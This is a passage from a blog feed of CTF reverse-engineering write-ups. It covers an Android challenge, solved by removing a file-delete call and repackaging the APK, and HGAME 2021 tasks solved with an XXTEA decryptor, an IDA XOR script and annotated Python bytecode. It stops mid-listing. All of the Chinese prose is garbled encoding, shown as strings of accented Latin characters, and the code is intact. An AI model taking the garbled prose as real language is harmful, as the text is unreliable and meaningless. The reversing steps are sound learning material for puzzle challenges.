alt="image-20210310201450601"></p><p>ä½†æ˜¯æ³¨æ„æ¸…å•æ–‡ä»¶ä¸­applicationä¸­çš„android:nameå±æ€§ï¼šè¿™é‡ŒæŒ‡å®šäº†<strong>appå¯åŠ¨æ—¶å…³è”çš„ä¸€ä¸ªapplicationï¼Œè¿™ä¸ªç±»çš„ä½œç”¨å°±æ˜¯åšä¸€äº›åˆå§‹åŒ–ï¼Œæ”¾ä¸€äº›å…¨å±€å˜é‡å’Œç¨‹åºä¸Šä¸‹æ–‡ç›¸å…³çš„ä¸œè¥¿</strong>ï¼Œé»˜è®¤æ˜¯android.app.Applicationã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310203122424.png" alt="image-20210310203122424"></p><p>æ¥åˆ°appå¯åŠ¨æ—¶æŒ‡å®šçš„è¿™ä¸ªç±»ï¼šNoNameAppã€‚æ¯”è¾ƒç®€å•çš„ä»£ç ï¼Œå°±æ˜¯å¾—åˆ°èµ„æºæ–‡ä»¶data.encç„¶åè·å–ä¸€ä¸ªaeskeyå¯¹å…¶è¿›è¡Œaesè§£å¯†ï¼Œä¸”è¿™é‡ŒæŒ‡å®šçš„è§£å¯†å¾—åˆ°çš„æ–‡ä»¶å’Œå­˜æ”¾è·¯å¾„ã€‚ç„¶åè¿›è¡ŒdexåŠ è½½å¹¶æŠŠFlagCheckerä¸­mFlagCheckerçš„å®ä¾‹è¿›è¡Œäº†æ›¿æ¢ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸Šé¢æˆ‘ä»¬åˆ†æå‡ºçš„nativeå±‚é‚£ä¸ªcheckå‡½æ•°è¿›è¡Œäº†æ›¿æ¢ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310203554497.png" alt="image-20210310203554497"></p><p>æ‰€ä»¥å¯ä»¥çŸ¥é“appçœŸæ­£æ£€æŸ¥çš„é€»è¾‘åœ¨è§£å¯†å‡ºçš„jaræ–‡ä»¶ä¸­ï¼Œç°åœ¨çš„ç›®çš„å°±æ˜¯å¾—åˆ°è¿™ä¸ªjarï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯ç›´æ¥åœ¨ç¨‹åºè¿è¡Œååœ¨æŒ‡å®šçš„è·¯å¾„ä¸‹å»æ‰¾ã€‚</p><p>è™½ç„¶appåœ¨åŠ è½½å®Œè§£å¯†åå¯¹è§£å¯†å‡ºçš„æ–‡ä»¶è¿›è¡Œäº†åˆ é™¤ï¼Œä½†æ˜¯å¯ä»¥å°†appçš„smaliä¿®æ”¹ï¼Œåˆ é™¤<strong>file.delete()ï¼›</strong>åå¯¹å…¶é‡æ–°æ‰“åŒ…ç„¶åç­¾åã€‚</p><p>è¿™é‡Œç­¾åå®Œåå®‰è£…é‡åˆ°äº†é—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ä¹‹å‰çŸ¥é“çš„appæœ‰<strong>android:testOnly=â€trueâ€</strong>ï¼Œè§£å†³åŠæ³•ï¼š1.å®‰è£…æ—¶åŠ ä¸Š-té€‰é¡¹ã€‚2.åœ¨æ¸…å•æ–‡ä»¶ä¸­åˆ é™¤è¯¥å±æ€§ã€‚</p><p>ç¬¬äºŒä¸ªé—®é¢˜ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310204857678.png" alt="image-20210310204857678"></p><p>æœç´¢åˆ°è¿™ç¯‡æ–‡ç«  <a href="https://testerhome.com/topics/18463" target="_blank" rel="noopener">https://testerhome.com/topics/18463</a></p><blockquote><p>å¦‚æœ AndroidManifest.xml ä¸­æœªè®¾ç½® extractNativeLibs=trueï¼Œä½¿ç”¨ apktool åç¼–è¯‘æ—¶æœ‰å¯èƒ½å¯¼è‡´ extractNativeLibs è¢«è®¾ç½®ä¸º falseã€‚</p></blockquote><p>è‡³äºextractNativeLibså±æ€§ï¼Œå¼€å¯çš„è¯å°±æ˜¯æŠŠapkä¸­çš„soè§£å‹ç¼©æå–åˆ°æœ¬åœ°å­˜å–ä¸€ä»½ï¼Œå…³é—­çš„è¯ä¸åœ¨æœ¬åœ°å­˜å‚¨ä¸€ä»½ï¼Œåœ¨è¿è¡Œæ—¶ç›´æ¥è°ƒç”¨appä¸­çš„soã€‚</p><p>å¦‚æœå…³é—­çš„è¯ï¼Œä¸”æˆ‘ä»¬apkæ˜¯æœªå¯¹é½æˆ–soæ–‡ä»¶æ˜¯å‹ç¼©çŠ¶æ€çš„è¯å°†é˜»æ­¢æˆ‘ä»¬å®‰è£…apkï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„æŠ¥çš„é”™ã€‚</p><p><strong>ç„¶åå¯¼è‡´æˆ‘ä»¬é»˜è®¤å¼€å¯extractNativeLibsçš„å±æ€§å…³é—­çš„åŸå› ï¼šä½¿ç”¨apktoolå¯¹appè¿›è¡Œåç¼–è¯‘å’Œå›ç¼–è¯‘ã€‚</strong></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310205935229.png" alt="image-20210310205935229"></p><p>æœ€åæŠŠè¿™ä¸ªå±æ€§æ”¹ä¸ºtrueï¼Œå›ç¼–è¯‘ç­¾ååï¼Œè¿è¡Œappï¼Œåœ¨data/data/åŒ…å/ä¸‹å¾—åˆ°è§£å¯†å‡ºçš„jaræ–‡ä»¶ï¼Œç®€å•çš„å¼‚æˆ–ã€‚ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310210138830.png" alt="image-20210310210138830"></p><p>æœ€åè¯´ä¸€ä¸‹ï¼Œåœ¨AKä¸­åç¼–è¯‘apké‡åˆ°<strong>com.googlecode.d2j.DexException: not support version</strong>çš„é—®é¢˜ã€‚</p><p>è¿™ä¸ªæ˜¯dex2jarç‰ˆæœ¬ä¸dexç‰ˆæœ¬ä¸å…¼å®¹ä¸»åŠ¨æŠ›å‡ºçš„å¼‚å¸¸ï¼Œä»æŠ¥é”™æ‰¾åˆ°dex-reader-2.1-20190905-lanchon.jaræ–‡ä»¶ä¸­çš„DexFileReaderå‡½æ•°ï¼Œçœ‹æºç ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310210853842.png" alt="image-20210310210853842"></p><p>è§£å†³åŠæ³•ï¼Œæ›´æ¢æœ€æ–°çš„dex2jarç‰ˆæœ¬å°±å¥½äº†ã€‚<a href="https://www.jianshu.com/p/55bf5f688e9a" target="_blank" rel="noopener">https://www.jianshu.com/p/55bf5f688e9a</a></p>]]></content>
      
      
      <categories>
          
          <category> Andriod </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021</title>
      <link href="/2021/02/04/HGAME%202021/"/>
      <url>/2021/02/04/HGAME%202021/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ä¸ªæœˆhgameç»“æŸäº†ï¼Œåšå®Œäº†é€†å‘é¢˜ï¼Œæ”¶è·å¾ˆå¤§ï¼Œmiscçš„ç­¾åˆ°é¢˜åšæ¥ç©äº†ä¸€ä¸‹ã€‚<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h3><p>è€ƒäº†ä¸€ä¸ªxxteaåŠ å¯†ç®—æ³•ï¼škeyæ˜¯{1, 2, 3, 4}</p><p><img src="https://i.loli.net/2021/02/27/imfSALBWP2nDy7o.png" alt="image-20210204180727273"></p><p>è·Ÿç€ç®—æ³•é€»è¾‘é€†ä¸€ä¸‹å°±è¡Œäº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> LEN = <span class="number">35</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = <span class="number">0x9E3779B9</span> * (<span class="number">52</span> / LEN) - <span class="number">0x4AB325AA</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> KEY[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">35</span>, <span class="number">179</span>,  <span class="number">78</span>, <span class="number">231</span>,  <span class="number">54</span>,  <span class="number">40</span>, <span class="number">167</span>, <span class="number">183</span>, <span class="number">226</span>, <span class="number">111</span>, </span><br><span class="line">  <span class="number">202</span>,  <span class="number">89</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">124</span>, <span class="number">150</span>, <span class="number">116</span>,  <span class="number">38</span>, <span class="number">128</span>, <span class="number">231</span>, </span><br><span class="line">  <span class="number">230</span>,  <span class="number">84</span>,  <span class="number">45</span>,  <span class="number">61</span>,  <span class="number">86</span>,   <span class="number">3</span>, <span class="number">157</span>, <span class="number">138</span>, <span class="number">156</span>, <span class="number">195</span>, </span><br><span class="line">  <span class="number">220</span>, <span class="number">153</span>, <span class="number">237</span>, <span class="number">216</span>,  <span class="number">38</span>, <span class="number">112</span>, <span class="number">173</span>, <span class="number">253</span>,  <span class="number">51</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">85</span>, <span class="number">150</span>, <span class="number">244</span>, <span class="number">158</span>, <span class="number">111</span>, <span class="number">156</span>,  <span class="number">92</span>,  <span class="number">76</span>, <span class="number">208</span>, </span><br><span class="line">  <span class="number">229</span>,  <span class="number">27</span>,  <span class="number">23</span>, <span class="number">174</span>,  <span class="number">35</span>, <span class="number">103</span>, <span class="number">194</span>, <span class="number">165</span>, <span class="number">112</span>,  <span class="number">82</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">19</span>,  <span class="number">66</span>, <span class="number">172</span>, <span class="number">178</span>, <span class="number">103</span>, <span class="number">190</span>, <span class="number">132</span>, <span class="number">121</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">92</span>, <span class="number">112</span>, <span class="number">152</span>,  <span class="number">61</span>,  <span class="number">81</span>,  <span class="number">92</span>,  <span class="number">45</span>, <span class="number">218</span>,  <span class="number">54</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">69</span>, <span class="number">150</span>,  <span class="number">23</span>,  <span class="number">34</span>, <span class="number">157</span>,  <span class="number">82</span>, <span class="number">227</span>,  <span class="number">92</span>, <span class="number">251</span>, <span class="number">225</span>, </span><br><span class="line">  <span class="number">137</span>, <span class="number">209</span>, <span class="number">137</span>, <span class="number">212</span>,  <span class="number">91</span>, <span class="number">232</span>,  <span class="number">31</span>, <span class="number">209</span>, <span class="number">200</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">150</span>, <span class="number">193</span>, <span class="number">181</span>,  <span class="number">84</span>, <span class="number">144</span>, <span class="number">180</span>, <span class="number">124</span>, <span class="number">182</span>, <span class="number">202</span>, <span class="number">228</span>, </span><br><span class="line">   <span class="number">23</span>,  <span class="number">33</span>, <span class="number">148</span>, <span class="number">249</span>, <span class="number">227</span>, <span class="number">157</span>, <span class="number">170</span>, <span class="number">161</span>,  <span class="number">90</span>,  <span class="number">47</span>, </span><br><span class="line">  <span class="number">253</span>,   <span class="number">1</span>, <span class="number">232</span>, <span class="number">167</span>, <span class="number">171</span>, <span class="number">110</span>,  <span class="number">13</span>, <span class="number">195</span>, <span class="number">156</span>, <span class="number">220</span>, </span><br><span class="line">  <span class="number">173</span>,  <span class="number">27</span>,  <span class="number">74</span>, <span class="number">176</span>,  <span class="number">83</span>,  <span class="number">52</span>, <span class="number">249</span>,   <span class="number">6</span>, <span class="number">164</span>, <span class="number">146</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">de_xxtea</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ENC;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *key = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)KEY;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> delat1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(delat &gt;&gt; <span class="number">2</span>);</span><br><span class="line">enc[LEN<span class="number">-1</span>] -= ((key[((LEN<span class="number">-1</span>)^delat1)&amp;<span class="number">3</span>]^enc[LEN<span class="number">-2</span>])+(enc[<span class="number">0</span>]^delat)) ^ (((<span class="number">4</span>*enc[<span class="number">0</span>])^(enc[LEN<span class="number">-2</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[LEN<span class="number">-2</span>])^(enc[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = LEN<span class="number">-2</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">enc[i] -= ((key[(i^delat1)&amp;<span class="number">3</span>]^enc[i<span class="number">-1</span>])+(enc[i+<span class="number">1</span>]^delat)) ^ (((<span class="number">4</span>*enc[i+<span class="number">1</span>])^(enc[i<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[i<span class="number">-1</span>])^(enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line">i--; </span><br><span class="line">&#125;<span class="keyword">while</span>(i != <span class="number">0</span>);</span><br><span class="line">enc[<span class="number">0</span>] -= ((key[(<span class="number">0</span>^delat1)&amp;<span class="number">3</span>]^enc[LEN<span class="number">-1</span>])+(enc[<span class="number">1</span>]^delat)) ^ (((<span class="number">4</span>*enc[<span class="number">1</span>])^(enc[LEN<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[LEN<span class="number">-1</span>])^(enc[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">delat += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(delat != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">de_xxtea();</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, ENC[i*<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;l00ks_1ike_y0u_f0Und_th3_t34&#125;</span></span><br></pre></td></tr></table></figure><h3 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h3><p>å°±æ˜¯ä¸€ä¸ªå¼‚æˆ–è§£å¯†ï¼Œä½†æ˜¯å¯ä»¥ä»è¿™é‡Œå­¦ä¹ ä¸€ä¸‹STLæ¨¡æ¿ä¸­çš„stringçš„ç»“æ„ã€‚</p><p>èƒ½çŒœæµ‹å‡ºv14å°±æ˜¯æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œä½†æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿå…¶å®ä½¿ç”¨äº†stringç»“æ„ã€‚</p><p><img src="https://i.loli.net/2021/02/27/IbUASK8JgpGLFr6.png" alt="image-20210204182522063"></p><p>stringç»“æ„ï¼šä¸€å…±å 24ä¸ªå­—èŠ‚ï¼ˆè¿™ä¹Ÿæ˜¯ä¸€ä¸ªå¯ä»¥è®©æˆ‘ä»¬ç”¨æ¥è¯†åˆ«çš„ç‰¹å¾ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">string</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> _Buf[<span class="number">16</span>];           <span class="comment">// å½“å­—ç¬¦ä¸²é•¿åº¦å°äºç­‰äº0xFæ—¶ï¼Œæ•°æ®å­˜å‚¨åœ¨_Bufæ•°ç»„ä¸­</span></span><br><span class="line">                             <span class="comment">// å¤§äº0xFæ—¶å°†åˆ†é…ä¸€ä¸ªå˜é‡ï¼Œ_Bufå­˜å‚¨çš„æ˜¯è¯¥å˜é‡åœ°å€ã€‚</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _Mysize;    <span class="comment">// å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _Myres;     <span class="comment">// å¯å­˜å‚¨çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥æµ‹è¯•ä¸€ä¸ªè¾“å…¥çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2021/02/27/zMNw8FvRtLHaGPT.png" alt="image-20210204182822594"></p><p>æœ€åé¢˜è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x07FF756E13480</span></span><br><span class="line">cnt = <span class="number">0xff</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">    flag += chr(get_byte(addr)^cnt)</span><br><span class="line">    cnt -= <span class="number">1</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#hgame&#123;hello_re_player&#125;</span></span><br></pre></td></tr></table></figure><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>ç»™äº†é€šè¿‡disæ¨¡å—å¾—åˆ°çš„pythonåæ±‡ç¼–ä»£ç ï¼Œæˆ‘æŠŠå¯¹åº”çš„pythonä»£ç æ³¨é‡Šäº†ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">4</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (input)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="string">'give me your flag:\n'</span>)</span><br><span class="line">              <span class="number">4</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (raw_flag) <span class="comment">#raw_flag = input('give me your flag:\n')</span></span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>           <span class="number">8</span> LOAD_GLOBAL              <span class="number">1</span> (list)</span><br><span class="line">             <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (raw_flag)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">2</span> (<span class="number">6</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">3</span> (<span class="number">-1</span>)</span><br><span class="line">             <span class="number">16</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">             <span class="number">18</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">20</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">1</span> (cipher)<span class="comment">#cipher = list(raw_flag[6:-1])</span></span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">24</span> LOAD_GLOBAL              <span class="number">2</span> (len)</span><br><span class="line">             <span class="number">26</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">28</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> STORE_FAST               <span class="number">2</span> (length)<span class="comment">#length = len(cipher)</span></span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">32</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">             <span class="number">34</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">38</span> BINARY_FLOOR_DIVIDE</span><br><span class="line">             <span class="number">40</span> CALL_FUNCTION            <span class="number">1</span><span class="comment">#range(length/2)</span></span><br><span class="line">             <span class="number">42</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">44</span> FOR_ITER                <span class="number">54</span> (to <span class="number">100</span>)</span><br><span class="line">             <span class="number">46</span> STORE_FAST               <span class="number">3</span> (i)<span class="comment">#for i in range(length/2):</span></span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">48</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">52</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">54</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">56</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">58</span> BINARY_ADD</span><br><span class="line">             <span class="number">60</span> BINARY_SUBSCR<span class="comment">#cipher[2*i+1]</span></span><br><span class="line">             <span class="number">62</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">64</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">66</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">68</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">70</span> BINARY_SUBSCR<span class="comment">#cipher[2*i]</span></span><br><span class="line">             <span class="number">72</span> ROT_TWO<span class="comment">#swap æ”¹å˜æŒ‡é’ˆçš„æŒ‡å‘æ¥å®ç°</span></span><br><span class="line">             <span class="number">74</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">76</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">78</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">80</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">82</span> STORE_SUBSCR</span><br><span class="line">             <span class="number">84</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">86</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">88</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">90</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">92</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">94</span> BINARY_ADD</span><br><span class="line">             <span class="number">96</span> STORE_SUBSCR<span class="comment">#cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]</span></span><br><span class="line">             <span class="number">98</span> JUMP_ABSOLUTE           <span class="number">44</span></span><br><span class="line"><span class="comment">#for i in range(length/2):</span></span><br><span class="line"><span class="comment">#cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]</span></span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>     &gt;&gt;  <span class="number">100</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">            <span class="number">102</span> STORE_FAST               <span class="number">4</span> (res)<span class="comment">#res = []</span></span><br><span class="line"></span><br><span class="line"> <span class="number">13</span>         <span class="number">104</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">            <span class="number">106</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">            <span class="number">108</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">110</span> GET_ITER</span><br><span class="line">        &gt;&gt;  <span class="number">112</span> FOR_ITER                <span class="number">26</span> (to <span class="number">140</span>)</span><br><span class="line">            <span class="number">114</span> STORE_FAST               <span class="number">3</span> (i)<span class="keyword">for</span> i <span class="keyword">in</span> range(length)</span><br><span class="line"></span><br><span class="line"> <span class="number">14</span>         <span class="number">116</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">118</span> LOAD_METHOD              <span class="number">4</span> (append)</span><br><span class="line">            <span class="number">120</span> LOAD_GLOBAL              <span class="number">5</span> (ord)</span><br><span class="line">            <span class="number">122</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">            <span class="number">124</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">126</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">128</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">130</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">132</span> BINARY_XOR</span><br><span class="line">            <span class="number">134</span> CALL_METHOD              <span class="number">1</span><span class="comment">#res.append(ord(cipher[i])^i)</span></span><br><span class="line">            <span class="number">136</span> POP_TOP</span><br><span class="line">            <span class="number">138</span> JUMP_ABSOLUTE          <span class="number">112</span></span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>     &gt;&gt;  <span 